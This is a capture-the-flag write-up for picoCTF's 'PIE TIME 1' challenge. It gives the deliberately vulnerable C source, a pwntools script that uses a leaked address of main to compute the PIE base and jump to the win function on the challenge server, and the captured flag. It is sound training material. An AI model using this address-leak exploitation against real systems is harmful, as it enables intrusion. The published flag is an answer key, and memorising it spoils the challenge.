# [Pwn] PIE TIME 1

## 📚 Overview

> *"Can you try to get the flag? Beware we have PIE!"*

> *"Hints - Can you figure out what changed between the address you found locally and in the server output?"*

## 💻 Source Code

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

## ⚙ Full Script

```python
from pwn import *
elf = context.binary = ELF("./vuln", checksec=False)

#p = process('./vuln')
p = remote("rescued-float.picoctf.net", 51144)

p.recvuntil(b'Address of main: ')

LEAK_ADDR = int(p.recv(14), 16)
log.info("Leak address: " + hex(LEAK_ADDR))
BASE_ADDR = LEAK_ADDR - elf.symbols.main
log.info("Base address: " + hex(BASE_ADDR))
WIN_ADDR = elf.symbols.win + BASE_ADDR
log.info("Win address: " + hex(WIN_ADDR))

p.sendlineafter(b"Enter the address to jump to, ex => 0x12345: ", hex(WIN_ADDR))
response = p.recvall(timeout=1).strip()
print(response.decode())

p.close()
```

## 🏳 Flag 

`picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_a267144a}`